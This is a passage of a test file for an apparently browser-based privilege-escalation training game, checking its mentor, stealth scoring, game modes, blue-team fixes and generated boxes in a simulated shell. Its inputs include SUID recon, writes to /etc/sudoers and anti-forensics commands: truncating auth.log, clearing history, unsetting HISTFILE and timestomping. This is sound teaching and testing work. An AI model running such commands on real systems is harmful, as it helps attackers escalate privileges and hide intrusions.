    // the first (faster) run must be left untouched, even though this run
    // also produced a cmdLog.
    gsandbox4.SESSION.startTime = Date.now() - 60000;
    gsandbox4.SESSION.cmdLog = [{ cmd: 'ls', dt: 50 }];
    G4.renderStats();
    const slowerRunIgnored = G4.ghosts[lvlId].length === 2 && G4.ghosts[lvlId][0].cmd === 'id';

    const ghostCaptureOk = firstRunCaptured && slowerRunIgnored;
    console.log(`${ghostCaptureOk ? 'PASS' : 'FAIL'}  ghost log capture (only saved on a new best time, untouched otherwise)`);
    ghostCaptureOk ? pass++ : fail++;
}

// ── Service-worker cache version vs package.json ────────────────────────────
// Cache-first PWA: a returning visitor keeps whatever JS/CSS was cached under
// CACHE_VERSION forever, until that string itself changes — the fetch handler
// never revalidates against the network. Every past release was supposed to
// bump it alongside package.json but didn't always (v6 vs 17 package bumps by
// the time this test was written) — assert they match so "ship a code change,
// forget the cache key" fails loudly instead of quietly stranding installed
// users on old code.
{
    const pkgVersion = JSON.parse(fs.readFileSync(path.join(REPO, 'package.json'), 'utf8')).version;
    const swSrc = fs.readFileSync(path.join(REPO, 'service-worker.js'), 'utf8');
    const m = swSrc.match(/CACHE_VERSION\s*=\s*'rootquest-v([^']+)'/);
    const swVersion = m && m[1];
    const ok = swVersion === pkgVersion;
    console.log(`${ok ? 'PASS' : 'FAIL'}  service-worker CACHE_VERSION matches package.json (${swVersion} vs ${pkgVersion})`);
    ok ? pass++ : fail++;
}

// ── Mentor engine: rules fire, are rate-limited, never spoil/score ──────────
// Loaded standalone (mentor.js has no hard dependency on levels.js/main.js —
// it reads window.SESSION/GAME/MACHINE_META defensively at call time), with
// small stand-ins for CMD/TERM/SESSION so the rule engine can be driven
// deterministically without a real box.
{
    const msandbox = {};
    msandbox.window = msandbox;
    msandbox.globalThis = msandbox;
    msandbox.console = console;
    vm.createContext(msandbox);
    msandbox.currentLang = 'en';
    msandbox.CMD = {
        execute(raw) {
            const bad = /^nope/.test(raw);
            return [{ text: bad ? 'Permission denied' : 'ok', cls: bad ? 'err' : '' }];
        }
    };
    const printed = [];
    msandbox.TERM = { print: (lines) => printed.push(...lines), scrollToBottom: () => {} };
    msandbox.SESSION = { isRoot: false, blueTeam: false, cmdCount: 0 };
    msandbox.GAME = { level: () => ({}), currentLevel: 0 };
    msandbox.MACHINE_META = [{ cat: 'SUID' }];
    msandbox.MENTORMODE = { enabled: true };
    vm.runInContext(JS('mentor.js'), msandbox, { filename: 'mentor.js' });
    msandbox.MENTOR.resetForLevel();

    // Recon nudge: RECON_THRESHOLD (7) commands go by, none matching the
    // SUID recon pattern -> exactly one 'mentor'-classed line printed.
    for (let i = 1; i <= 7; i++) {
        msandbox.SESSION.cmdCount = i;
        msandbox.CMD.execute('ls -la');
    }
    const reconFired = printed.filter(l => l.cls === 'mentor').length === 1;

    // Off switch: with MENTORMODE disabled, nothing gets printed at all,
    // even past every threshold.
    printed.length = 0;
    msandbox.MENTORMODE.enabled = false;
    msandbox.MENTOR.resetForLevel();
    for (let i = 1; i <= 30; i++) {
        msandbox.SESSION.cmdCount = i;
        msandbox.CMD.execute('nope');
    }
    const silentWhenOff = printed.length === 0;

    // Error streak: three consecutive failing commands (spaced past the
    // rate-limit gate) should fire the 'errors' rule exactly once, and the
    // bug this test guards against — the streak counter resetting/never
    // incrementing because it lived behind the rate-limit gate — must not
    // resurface (validated by deliberately re-introducing that ordering and
    // confirming this assertion goes red).
    printed.length = 0;
    msandbox.MENTORMODE.enabled = true;
    msandbox.MENTOR.resetForLevel();
    msandbox.SESSION.cmdCount = 1;
    msandbox.CMD.execute('ls -la'); // clean command first, so the streak starts at 0
    for (let i = 2; i <= 4; i++) {
        msandbox.SESSION.cmdCount = i;
        msandbox.CMD.execute('nope');
    }
    const errorsFired = printed.filter(l => l.cls === 'mentor').length === 1;

    const ok = reconFired && silentWhenOff && errorsFired;
    console.log(`${ok ? 'PASS' : 'FAIL'}  mentor engine (recon nudge fires once, mode-off stays silent, 3-error streak fires once)`);
    ok ? pass++ : fail++;
}

// ── Blue team v2: revoking a sudo rule has to actually revoke it ───────────
// The per-box loop above already replays the documented fix on all 22
// generated blocks. What it can't show is the failure mode this design exists
// to prevent: an edit that *looks* like a fix but leaves the grant standing.
{
    const lvl = LEVELS.find(l => l.harden && l.harden.type === 'revoke_sudo');
    loadLevel(lvl);
    const player = lvl.user || 'player';

    // The file is real, root-owned and unreadable to the player — exactly as
    // it would be on a live host.
    const node = sandbox.FS.get('/etc/sudoers');
    const realFile = !!node && node.mode === '440' && node.owner === 'root'
        && /ALL=\(/.test(node.content) && sandbox.FS.canRead('/etc/sudoers') === false;

    // Before hardening, the box is exploitable and knows it.
    const startsVulnerable = sandbox.CMD.checkHardened(lvl) === false;

    play(SOLUTIONS[lvl.id]);
    sandbox.SESSION.blueTeam = true;

    // A cosmetic edit — adding a comment above the rule — must not count.
    sandbox.CMD.execute("sed -i 's|# User privilege|# TODO User privilege|' /etc/sudoers");
    const cosmeticRejected = sandbox.CMD.checkHardened(lvl) === false;

    // The real fix does.
    sandbox.CMD.execute(`sed -i '/^${player}/d' /etc/sudoers`);
    const fixAccepted = sandbox.CMD.checkHardened(lvl) === true;

    // And the exploit genuinely stops working: sudo -l no longer lists it.
    sandbox.SESSION.user = player;
    sandbox.SESSION.isRoot = false;
    sandbox.SESSION.sudoAuthed = true;
    const listed = sandbox.CMD.execute('sudo -l');
    const noLongerGranted = !listed.some(l => l.text.includes(lvl.harden.bin));

    const ok = realFile && startsVulnerable && cosmeticRejected && fixAccepted && noLongerGranted;
    console.log(`${ok ? 'PASS' : 'FAIL'}  blue team revoke_sudo (real /etc/sudoers, cosmetic edit rejected, exploit really closes)`);
    ok ? pass++ : fail++;
}

// ── Blue-team coverage: how many boxes actually have a fix phase ───────────
{
    const withFix = LEVELS.filter(l => l.harden).length;
    const sudoBoxes = LEVELS.filter(l => (l.sudoers && (l.sudoers[l.user || 'player'] || []).length)).length;
    const generated = LEVELS.filter(l => l.harden && l.harden.type === 'revoke_sudo').length;
    // Every box that grants the player a sudo rule must now have a fix phase,
    // and every generated block must carry all three languages.
    const covered = generated === sudoBoxes;
    const trilingual = LEVELS.filter(l => l.harden).every(l =>
        ['en', 'fr', 'es'].every(lang => l.harden.obj[lang] && l.harden.hint[lang]));
    const ok = covered && trilingual && withFix >= 33;
    console.log(`${ok ? 'PASS' : 'FAIL'}  blue-team coverage (${withFix}/${LEVELS.length} boxes have a fix phase, all trilingual)`);
    ok ? pass++ : fail++;
}

// ── Mentor category coverage ───────────────────────────────────────────────
// Every category a real machine declares needs both a recon pattern and a
// flavour line, or the mentor silently falls back to the generic nudge on
// boxes where it had something specific to say.
{
    // MACHINE_META lives in main.js, which the primary sandbox deliberately
    // doesn't load — so it gets its own, or this test passes on an empty list.
    const cs = {};
    cs.window = cs; cs.globalThis = cs; cs.console = console;
    cs.addEventListener = () => {};
    cs.localStorage = { getItem: () => null, setItem: () => {} };
    cs.document = { addEventListener: () => {}, getElementById: () => null, querySelectorAll: () => [], body: { classList: { add() {}, remove() {} } } };
    vm.createContext(cs);
    vm.runInContext(JS('levels.js'), cs, { filename: 'levels.js' });
    vm.runInContext(JS('main.js'), cs, { filename: 'main.js' });
    const cats = [...new Set((cs.MACHINE_META || []).map(m => m && m.cat).filter(Boolean))];

    const msandbox = {};
    msandbox.window = msandbox; msandbox.globalThis = msandbox; msandbox.console = console;
    vm.createContext(msandbox);
    vm.runInContext(JS('mentor.js'), msandbox, { filename: 'mentor.js' });
    const M = msandbox.MENTOR;
    // CUSTOM and ROGUE are meant to fall through to the generic nudge: naming
    // the category would give away a box whose whole point is that you don't
    // know what kind it is.
    const exempt = ['CUSTOM', 'ROGUE'];
    const missing = cats.filter(c => !exempt.includes(c) && (!M.RECON_PATTERNS[c] || !M.CATEGORY_FLAVOR[c]));
    if (!cats.length) missing.push('MACHINE_META did not load');
    const trilingual = Object.values(M.CATEGORY_FLAVOR).every(f => f.en && f.fr && f.es);
    const ok = missing.length === 0 && trilingual;
    console.log(`${ok ? 'PASS' : 'FAIL'}  mentor category coverage (${cats.length} live categories${missing.length ? ', missing: ' + missing.join(',') : ''})`);
    ok ? pass++ : fail++;
}

// ── Mentor v2 rules: loops, found-but-unused, tier-adaptive pacing ─────────
{
    const msandbox = {};
    msandbox.window = msandbox; msandbox.globalThis = msandbox; msandbox.console = console;
    vm.createContext(msandbox);
    msandbox.currentLang = 'en';
    const printed = [];
    msandbox.CMD = { execute: (raw) => [{ text: raw, cls: '' }] };
    msandbox.TERM = { print: (lines) => printed.push(...lines), scrollToBottom: () => {} };
    msandbox.SESSION = { isRoot: false, blueTeam: false, cmdCount: 0 };
    msandbox.GAME = { level: () => ({}), currentLevel: 0 };
    msandbox.MACHINE_META = [{ cat: 'SUID', diff: 'MEDIUM' }];
    msandbox.MENTORMODE = { enabled: true };
    vm.runInContext(JS('mentor.js'), msandbox, { filename: 'mentor.js' });
    const M = msandbox.MENTOR;

    // Loop detection: the same command three times in a short window.
    M.resetForLevel();
    for (let i = 1; i <= 5; i++) { msandbox.SESSION.cmdCount = i; msandbox.CMD.execute('sudo -l'); }
    const loopFired = printed.filter(l => l.cls === 'mentor').length === 1
        && printed.some(l => /sudo -l/.test(l.text));

    // Found-but-never-used: reading a binary twice without running it.
    printed.length = 0;
    M.resetForLevel();
    M.observePaths('ls -la /usr/local/bin/backup-agent');
    M.observePaths('cat /usr/local/bin/backup-agent');
    const watching = M.idleFind() === '/usr/local/bin/backup-agent';
    // Running it clears the watch — the player did the thing.
    M.observePaths('/usr/local/bin/backup-agent');
    const clearedOnUse = M.idleFind() === null;

    // Tier-adaptive pacing: an ADVANCED box gets more rope than an ENTRY one.
    msandbox.MACHINE_META = [{ cat: 'SUID', diff: 'HARD' }];
    const hardPace = M.at(M.RECON_THRESHOLD);
    msandbox.MACHINE_META = [{ cat: 'SUID', diff: 'EASY' }];
    const easyPace = M.at(M.RECON_THRESHOLD);
    const paced = hardPace > M.RECON_THRESHOLD && easyPace < M.RECON_THRESHOLD;

    // A mode that forbids assistance silences the mentor entirely.
    printed.length = 0;
    msandbox.MODES = { assistAllowed: () => false };
    M.resetForLevel();
    for (let i = 1; i <= 30; i++) { msandbox.SESSION.cmdCount = i; msandbox.CMD.execute('nope'); }
    const silentInHardcore = printed.length === 0;

    const ok = loopFired && watching && clearedOnUse && paced && silentInHardcore;
    console.log(`${ok ? 'PASS' : 'FAIL'}  mentor v2 (loop detection, found-but-unused, tier pacing, hardcore silence)`);
    ok ? pass++ : fail++;
}

// ── Explanation mode v2: progressive reveal ────────────────────────────────
{
    const store = {};
    const ws = {};
    ws.window = ws; ws.globalThis = ws; ws.console = console;
    ws.localStorage = {
        getItem: (k) => (k in store ? store[k] : null),
        setItem: (k, v) => { store[k] = String(v); }
    };
    ws.document = { querySelectorAll: () => [] };
    vm.createContext(ws);
    vm.runInContext(JS('walkmode.js'), ws, { filename: 'walkmode.js' });
    const W = ws.WALKMODE;
    W.init();

    // Off by default, and nothing is revealed until you ask.
    const startsClosed = W.enabled === false;
    W.setLevel(1);
    const startsHidden = W.count() === 0;

    // One step at a time, and never past the end.
    W.revealNext(3); W.revealNext(3);
    const stepwise = W.count() === 2;
    W.revealNext(3);
    const cappedAtEnd = W.revealNext(3) === false && W.count() === 3;

    // The cursor is per-machine and survives a reload.
    W.setLevel(2);
    const perLevel = W.count() === 0;
    const ws2 = {};
    ws2.window = ws2; ws2.globalThis = ws2; ws2.console = console;
    ws2.localStorage = { getItem: (k) => (k in store ? store[k] : null), setItem: () => {} };
    ws2.document = { querySelectorAll: () => [] };
    vm.createContext(ws2);
    vm.runInContext(JS('walkmode.js'), ws2, { filename: 'walkmode.js' });
    ws2.WALKMODE.init();
    ws2.WALKMODE.setLevel(1);
    const persisted = ws2.WALKMODE.count() === 3;

    // Steps are ticked off once run, tolerating the noise players actually
    // type (redirection, spacing) but not matching an unrelated command.
    const history = ['find / -perm -4000 2>/dev/null', 'ls -la  /usr/bin/find'];
    const matchesExact = W.wasRun('find / -perm -4000', history);
    const matchesLoose = W.wasRun('ls -la /usr/bin/find', history);
    const noFalsePositive = W.wasRun('getcap -r /', history) === false;

    const ok = startsClosed && startsHidden && stepwise && cappedAtEnd && perLevel
        && persisted && matchesExact && matchesLoose && noFalsePositive;
    console.log(`${ok ? 'PASS' : 'FAIL'}  explanation mode v2 (one step at a time, per-box cursor, persists, ticks off run steps)`);
    ok ? pass++ : fail++;
}

// ── Mode registry: composition, sessions, persistence, composed rules ──────
{
    const store = {};
    const ms = {};
    ms.window = ms;
    ms.globalThis = ms;
    ms.console = console;
    ms.localStorage = {
        getItem: (k) => (k in store ? store[k] : null),
        setItem: (k, v) => { store[k] = String(v); },
        removeItem: (k) => { delete store[k]; }
    };
    vm.createContext(ms);
    vm.runInContext(JS('modes.js'), ms, { filename: 'modes.js' });
    ms.MODES.init();
    const M = ms.MODES;

    // Default is normal, and normal changes nothing about how the game plays.
    const defaultsSane = M.is('normal') && !M.is('stealth')
        && M.assistAllowed() === true
        && M.multiplier() === 1
        && M.stealthActive() === false
        && M.timeBudget('EASY') === 0;

    // Modifiers toggle independently and stack: turning one on doesn't turn
    // another off. This is the whole point of the composition refactor.
    M.set('normal');
    M.toggle('stealth');
    M.toggle('timeattack');
    const stacks = M.is('stealth') && M.is('timeattack') && !M.is('normal');
    // Their multipliers multiply and their assistance rules AND together.
    const multiplied = Math.abs(M.multiplier() - (1.5 * 1.75)) < 1e-9 && M.assistAllowed() === true;
    // Add hardcore: assistance now forbidden (AND), multiplier grows again.
    M.toggle('hardcore');
    const hardcoreLocks = M.assistAllowed() === false
        && Math.abs(M.multiplier() - (1.5 * 1.75 * 2)) < 1e-9;
    // Toggling a modifier off leaves the others standing.
    M.toggle('hardcore');
    const togglesOff = !M.is('hardcore') && M.is('stealth') && M.is('timeattack')
        && M.assistAllowed() === true;
    // Normal is the "off" switch — it clears the whole set.
    M.set('normal');
    const normalClears = M.is('normal') && M.multiplier() === 1;

    // Unknown ids are refused rather than silently accepted.
    const rejectsUnknown = M.toggle('nope') === false && M.set('nope') === false && M.is('normal');

    // Time budget only applies while time attack is one of the active modes.
    M.set('normal'); M.toggle('timeattack');
    const timeRules = M.timeBudget('EASY') === 180 && M.timeBudget('HARD') === 480
        && M.timeBudget('WAT') === M.TIME_BUDGET.CUSTOM;

    // Sessions mask the modifier set without destroying it: an exam reports
    // its own rules, and leaving it brings the modifiers straight back.
    M.set('normal'); M.toggle('stealth'); M.toggle('chaos');
    M.enterSession('exam');
    const sessionMasks = M.is('exam') && !M.is('stealth') && !M.is('chaos')
        && M.assistAllowed() === false && M.multiplier() === 2.5;
    M.exitSession();
    const sessionRestores = !M.is('exam') && M.is('stealth') && M.is('chaos');

    // Persistence: the modifier set survives a reload; the exam session does
    // not (it's owned by exam.js, restored from its own key).
    M.set('normal'); M.toggle('stealth'); M.toggle('hardcore');
    const persisted = JSON.parse(store['rootquest_modes']).sort().join() === 'hardcore,stealth';
    const ms2 = {};
    ms2.window = ms2; ms2.globalThis = ms2; ms2.console = console;
    ms2.localStorage = { getItem: (k) => (k in store ? store[k] : null), setItem: () => {} };
    vm.createContext(ms2);
    vm.runInContext(JS('modes.js'), ms2, { filename: 'modes.js' });
    ms2.MODES.init();
    const reloads = ms2.MODES.is('stealth') && ms2.MODES.is('hardcore');

    // A garbage stored value degrades to normal rather than breaking.
    const ms3 = {};
    ms3.window = ms3; ms3.globalThis = ms3; ms3.console = console;
    ms3.localStorage = { getItem: () => 'not json at all', setItem: () => {} };
    vm.createContext(ms3);
    vm.runInContext(JS('modes.js'), ms3, { filename: 'modes.js' });
    ms3.MODES.init();
    const survivesGarbage = ms3.MODES.is('normal');

    // Every declared mode has the i18n strings the picker renders.
    vm.runInContext(JS('i18n.js'), ms2, { filename: 'i18n.js' });
    const i18nComplete = ['en', 'fr', 'es'].every(lang =>
        M.CHALLENGES.every(m => ms2.I18N[lang]['mode_' + m.id] && ms2.I18N[lang]['modeDesc_' + m.id])
    );

    const ok = defaultsSane && stacks && multiplied && hardcoreLocks && togglesOff
        && normalClears && rejectsUnknown && timeRules && sessionMasks && sessionRestores
        && persisted && reloads && survivesGarbage && i18nComplete;
    console.log(`${ok ? 'PASS' : 'FAIL'}  mode registry (modifiers stack, mult multiplies, sessions mask, persistence + i18n)`);
    ok ? pass++ : fail++;
}

// ── Stealth engine: noise scoring, countermeasures, detection ───────────────
{
    const ss = {};
    ss.window = ss;
    ss.globalThis = ss;
    ss.console = console;
    vm.createContext(ss);
    ss.currentLang = 'en';
    ss.CMD = { execute: (raw) => [{ text: raw, cls: '' }] };
    const printed = [];
    ss.TERM = { print: (lines) => printed.push(...lines), scrollToBottom: () => {} };
    ss.SESSION = { isRoot: false, blueTeam: false, ghostReplaying: false };
    ss.MODES = { stealthActive: () => true };
    vm.runInContext(JS('stealth.js'), ss, { filename: 'stealth.js' });
    const S = ss.STEALTH;
    S.resetForLevel();

    // Scoped recon is genuinely cheaper than the same recon done globally —
    // this is the lesson the whole mode exists to teach, so it gets a test.
    const scopedQuieter = S.noiseFor('find /usr/bin -perm -4000 2>/dev/null').n
        < S.noiseFor('find / -perm -4000 2>/dev/null').n;
    const ordinaryCheap = S.noiseFor('ls -la').n === 1;
    const unknownDefaults = S.noiseFor('zzzz').n === ss.STEALTH.DEFAULT_NOISE.n;

    // A denied sudo stacks the failed-auth penalty on top of sudo's own noise.
    const quietSudo = S.noiseFor('sudo -l', [{ text: 'ok', cls: '' }]).n;
    const deniedSudo = S.noiseFor('sudo -l', [{ text: 'nope', cls: 'err' }]).n;
    const failureLouder = deniedSudo === quietSudo + S.FAILED_AUTH.n;

    // Every rule must carry all three languages, or a player switching to ES
    // silently gets English explanations.
    const whyTrilingual = [...S.RULES, S.DEFAULT_NOISE, S.FAILED_AUTH, ...S.COUNTERS]
        .every(r => r.why && r.why.en && r.why.fr && r.why.es);

    // Noise accumulates through the observer wrapper, not just in the pure core.
    S.resetForLevel();
    ss.CMD.execute('find / -perm -4000 2>/dev/null');
    const accumulates = S.detection === 16;

    // Countermeasures reduce the gauge, and each works exactly once.
    ss.CMD.execute('history -c');
    const counterHelps = S.detection === 6;
    const before = S.detection;
    ss.CMD.execute('history -c');
    const counterOnce = S.detection > before; // second use is ordinary noise now

    // Going loud pins the gauge at MAX and flags the run — once.
    S.resetForLevel();
    for (let i = 0; i < 12; i++) ss.CMD.execute('echo x >> /etc/sudoers');
    const capped = S.detection === S.MAX && S.detected === true && S.grade() === 'DETECTED';

    // Off switch: with stealth inactive nothing is scored at all.
    S.resetForLevel();
    ss.MODES.stealthActive = () => false;
    for (let i = 0; i < 5; i++) ss.CMD.execute('find / -perm -4000');
    const inertWhenOff = S.detection === 0;
    ss.MODES.stealthActive = () => true;

    // Grades map to the gauge the way the scorecard claims they do.
    S.resetForLevel();
    const grades = S.grade() === 'GHOST'
        && (S.detection = 40, S.grade() === 'QUIET')
        && (S.detection = 80, S.grade() === 'NOISY');

    // Blue-team phase, stealth active: the economics invert. Wiping a log now
    // SPIKES the gauge (a defender covering tracks is the reddest flag), while
    // the very same command REDUCED it during the attack.
    S.resetForLevel();
    ss.SESSION.blueTeam = false;
    const attackWipe = (ss.CMD.execute('truncate -s 0 /var/log/auth.log'), S.detection);
    const attackReduced = attackWipe === 0; // a counter can't push below zero from 0
    S.resetForLevel();
    ss.SESSION.blueTeam = true;
    ss.CMD.execute('truncate -s 0 /var/log/auth.log');
    const defendWipeLoud = S.detection >= 15;
    // Surgical hardening in the same phase stays quiet.
    S.resetForLevel();
    ss.SESSION.blueTeam = true;
    ss.CMD.execute('chmod u-s /usr/bin/find');
    const defendHardenQuiet = S.detection <= 5 && S.detection > 0;
    ss.SESSION.blueTeam = false;

    const ok = scopedQuieter && ordinaryCheap && unknownDefaults && failureLouder
        && whyTrilingual && accumulates && counterHelps && counterOnce && capped
        && inertWhenOff && grades && defendWipeLoud && defendHardenQuiet && attackReduced;
    console.log(`${ok ? 'PASS' : 'FAIL'}  stealth engine (scope matters, failures cost more, counters work once, blue-team inverts anti-forensics, inert when off)`);
    ok ? pass++ : fail++;
}

// ── Time attack: tier budgets, expiry, forfeit ─────────────────────────────
{
    const ts = {};
    ts.window = ts;
    ts.globalThis = ts;
    ts.console = console;
    vm.createContext(ts);
    ts.currentLang = 'en';
    ts.TERM = { print: () => {}, scrollToBottom: () => {} };
    ts.SESSION = { isRoot: false, blueTeam: false };
    ts.MACHINE_META = [{ diff: 'EASY' }, { diff: 'HARD' }, { diff: 'CUSTOM' }];
    ts.setInterval = () => 1;
    ts.clearInterval = () => {};
    vm.runInContext(JS('modes.js'), ts, { filename: 'modes.js' });
    vm.runInContext(JS('timeattack.js'), ts, { filename: 'timeattack.js' });
    const TA = ts.TIMEATTACK;

    ts.MODES.init();
    // No clock outside the mode, whatever the tier.
    const inertWhenOff = TA.budgetFor(0) === 0 && TA.budgetFor(1) === 0;

    ts.MODES.set('timeattack');
    const tiersMapped = TA.budgetFor(0) === 180 && TA.budgetFor(1) === 480 && TA.budgetFor(2) === 300;

    // The clock runs down and, at zero, forfeits the mode bonus without
    // touching the session — the player keeps their half-finished work.
    TA.startForLevel(0);
    const started = TA.remaining === 180 && TA.multiplierPenalty() === 0;
    for (let i = 0; i < 180; i++) TA.tick();
    const expired = TA.remaining === 0 && TA.expired === true && TA.multiplierPenalty() === 1;
    TA.tick();
    const stableAfterExpiry = TA.remaining === 0;

    // Rooting the box stops the clock rather than letting it expire in the
    // victory modal.
    TA.startForLevel(1);
    ts.SESSION.isRoot = true;
    TA.tick();
    const stopsOnRoot = TA.remaining === 480 && TA.expired === false;
    ts.SESSION.isRoot = false;

    const ok = inertWhenOff && tiersMapped && started && expired && stableAfterExpiry && stopsOnRoot;
    console.log(`${ok ? 'PASS' : 'FAIL'}  time attack (tier budgets, expiry forfeits the bonus, root stops the clock)`);
    ok ? pass++ : fail++;
}

// ── New shell commands backing the stealth countermeasures ─────────────────
// rm/truncate/unset/touch -r/history -c are real, permission-respecting
// commands, not stealth-only special cases — so they get tested as commands.
{
    loadLevel(LEVELS[0]);
    sandbox.CMD.execute('echo secret > /tmp/notes.txt');
    const created = sandbox.FS.exists('/tmp/notes.txt');
    sandbox.CMD.execute('truncate -s 0 /tmp/notes.txt');
    const truncated = (sandbox.FS.get('/tmp/notes.txt').content || '') === '';
    sandbox.CMD.execute('rm /tmp/notes.txt');
    const removed = !sandbox.FS.exists('/tmp/notes.txt');
    // The parent's children list must not keep a dangling entry behind.
    const parentClean = !(sandbox.FS.get('/tmp').children || []).includes('notes.txt');

    const missing = sandbox.CMD.execute('rm /tmp/does-not-exist');
    const errsOnMissing = missing.some(l => l.cls === 'err');
    const forced = sandbox.CMD.execute('rm -f /tmp/does-not-exist');
    const quietWithForce = !forced.some(l => l.cls === 'err');

    sandbox.CMD.execute('mkdir /tmp/d');
    sandbox.CMD.execute('echo a > /tmp/d/a');
    const dirNeedsR = sandbox.CMD.execute('rm /tmp/d').some(l => l.cls === 'err');
    sandbox.CMD.execute('rm -r /tmp/d');
    const recursed = !sandbox.FS.exists('/tmp/d') && !sandbox.FS.exists('/tmp/d/a');

    sandbox.SESSION.env.HISTFILE = '/home/player/.bash_history';
    sandbox.CMD.execute('unset HISTFILE');
    const unsetOk = sandbox.SESSION.env.HISTFILE === undefined;

    sandbox.TERM.history = ['ls', 'id'];
    const cleared = sandbox.CMD.execute('history -c');
    const historyCleared = cleared.length === 0 && sandbox.TERM.history.length === 0;

    // touch -r copies timestamps from a reference; the reference itself must
    // not be created as a side effect, and a missing one is an error.
    sandbox.CMD.execute('echo x > /tmp/ref');
    sandbox.CMD.execute('touch -r /tmp/ref /tmp/stomped');
    const stompOk = sandbox.FS.exists('/tmp/stomped');
    const badRef = sandbox.CMD.execute('touch -r /tmp/nothing /tmp/other').some(l => l.cls === 'err');

    const ok = created && truncated && removed && parentClean && errsOnMissing
        && quietWithForce && dirNeedsR && recursed && unsetOk && historyCleared
        && stompOk && badRef;
    console.log(`${ok ? 'PASS' : 'FAIL'}  anti-forensics commands (rm, rm -r, truncate, unset, history -c, touch -r)`);
    ok ? pass++ : fail++;
}

// ── Rogue mode: determinism, validity, and actual solvability ──────────────
// The mode's whole promise is "same seed, same machine". A generated box that
// can't be rooted, or that differs between two runs of the same seed, breaks
// it — so both get asserted, and the generated box is played to root through
// the real command engine rather than merely inspected.
{
    const rs = {};
    rs.window = rs; rs.globalThis = rs; rs.console = console;
    rs.document = {
        getElementById: () => null,
        querySelectorAll: () => [],
        body: { classList: { add() {}, remove() {} } },
    };
    rs.document.addEventListener = () => {};
    rs.addEventListener = () => {};
    rs.localStorage = { getItem: () => null, setItem: () => {} };
    rs.setTimeout = () => {};
    vm.createContext(rs);
    rs.currentLang = 'en';
    // main.js comes along for GAME_CUSTOM.validate — rogue boxes must clear
    // the exact same bar as a hand-written import, not a looser one.
    for (const f of ['i18n.js', 'gtfobins.js', 'fs.js', 'levels.js', 'commands.js', 'main.js', 'boxbuilder.js', 'rogue.js']) {
        vm.runInContext(JS(f), rs, { filename: f });
    }
    const R = rs.ROGUE;

    // Seeds round-trip, and a non-hex seed is hashed rather than rejected.
    const seedRoundTrip = R.parseSeed(R.formatSeed(0xabc123)) === 0xabc123;
    const wordSeed = R.parseSeed('monday') === R.parseSeed('monday')
        && R.parseSeed('monday') !== R.parseSeed('tuesday');

    // Determinism: identical output for the same seed, different for another.
    const a1 = JSON.stringify(R.build(1234));
    const a2 = JSON.stringify(R.build(1234));
    const b1 = JSON.stringify(R.build(1235));
    const deterministic = a1 === a2 && a1 !== b1;

    // Every seed must produce a box that passes the same validation a
    // hand-written custom box goes through — no special-casing at import.
    let allValid = true;
    const classes = new Set();
    for (let seed = 0; seed < 60; seed++) {
        const box = R.build(seed);
        if (!rs.GAME_CUSTOM) break;
        if (!rs.GAME_CUSTOM.validate(box).valid) { allValid = false; break; }
        classes.add(box.wins[0].type);
    }
    // Over 60 seeds the generator must actually vary the vulnerability class,
    // otherwise "rogue" is one box with different filenames.
    const varied = classes.size >= 3;

    // Decoys are present but never overwrite the vector, and the flag file is
    // still there for the win condition to reward.
    const sample = R.build(7);
    const hasFlag = !!sample.fs['/root/flag.txt'];
    const hasDecoys = Object.keys(sample.fs).some(p => /README|motd|notes\.txt|config\.yml/.test(p));

    // Solvability: play a generated SUID box through the real engine.
    const suidSeed = [...Array(200).keys()].find(s => R.build(s).wins[0].type === 'custom_suid_exploit');
    let rooted = false;
    if (suidSeed !== undefined) {
        const box = R.build(suidSeed);
        const lvl = { ...box, id: 9999, title: box.title, brief: box.brief };
        rs.GAME = { level: () => lvl, win: () => {}, giveHint: () => [], nextLevel: () => [], reset: () => {}, markHardened: () => {}, currentLevel: 0 };
        rs.updatePrompt = () => {};
        rs.FS.load(lvl);
        Object.assign(rs.SESSION, {
            user: 'player', host: lvl.host, cwd: '/home/player',
            env: { PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' },
            isRoot: false, cmdCount: 0, tmpBins: {}, blueTeam: false, sudoAuthed: false,
        });
        rs.TERM = { history: [] };
        const bin = Object.keys(box.fs).find(p => box.fs[p] && box.fs[p].exploit === 'custom_suid_exploit');
        rs.CMD.execute(bin);
        rooted = rs.SESSION.isRoot === true;
    }

    // Solvability of a generated *sudo* box, now that its binary is drawn
    // from the full GTFOBins table rather than nine hardcoded names: play the
    // box's own final hint (the payload) and assert root.
    const sudoSeed = [...Array(400).keys()].find(s => R.build(s).wins[0].type === 'sudo_shell');
    let sudoRooted = false;
    let sudoBinTried = null;
    if (sudoSeed !== undefined) {
        const box = R.build(sudoSeed);
        const lvl = { ...box, id: 9998 };
        rs.GAME = { level: () => lvl, win: () => {}, giveHint: () => [], nextLevel: () => [], reset: () => {}, markHardened: () => {}, currentLevel: 0 };
        rs.FS.load(lvl);
        Object.assign(rs.SESSION, {
            user: 'player', host: lvl.host, cwd: '/home/player',
            env: { PATH: '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin' },
            isRoot: false, cmdCount: 0, tmpBins: {}, blueTeam: false, sudoAuthed: true,
        });
        rs.TERM = { history: [] };
        sudoBinTried = box.sudoers.player[0].cmd.split('/').pop();
        // The dataset payload is what the box's final hint is built from — play
        // its first line, exactly what a player copying the hint would run.
        const payload = rs.GTFOBINS.payload(sudoBinTried)
            || rs.BOXBUILDER.SUDO_PAYLOADS[sudoBinTried];
        rs.CMD.execute(payload.split('\n')[0]);
        sudoRooted = rs.SESSION.isRoot === true;
    }

    const ok = seedRoundTrip && wordSeed && deterministic && allValid && varied
        && hasFlag && hasDecoys && rooted && sudoRooted;
    console.log(`${ok ? 'PASS' : 'FAIL'}  rogue mode (same seed same box, ${classes.size} vuln classes over 60 seeds, SUID + sudo(${sudoBinTried}) boxes rootable)`);
    ok ? pass++ : fail++;
}

// ── index.html ↔ i18n contract ─────────────────────────────────────────────
// Every [data-i18n] key in the markup must exist in all three dictionaries,
// and every element the new code reaches for by id must exist in the page.
// Cheap, and it catches the failure mode a UI change actually has: markup
// shipped ahead of (or behind) the strings and the wiring.
{
    const html = fs.readFileSync(path.join(REPO, 'index.html'), 'utf8');
    const keys = [...html.matchAll(/data-i18n(?:-placeholder)?="([^"]+)"/g)].map(m => m[1]);
    const isandbox = {};
    isandbox.window = isandbox; isandbox.globalThis = isandbox;
    vm.createContext(isandbox);
    vm.runInContext(JS('i18n.js'), isandbox, { filename: 'i18n.js' });
    const missing = [];
    for (const k of new Set(keys)) {
        for (const lang of ['en', 'fr', 'es']) {
            if (isandbox.I18N[lang][k] === undefined) missing.push(`${lang}:${k}`);
        }
    }
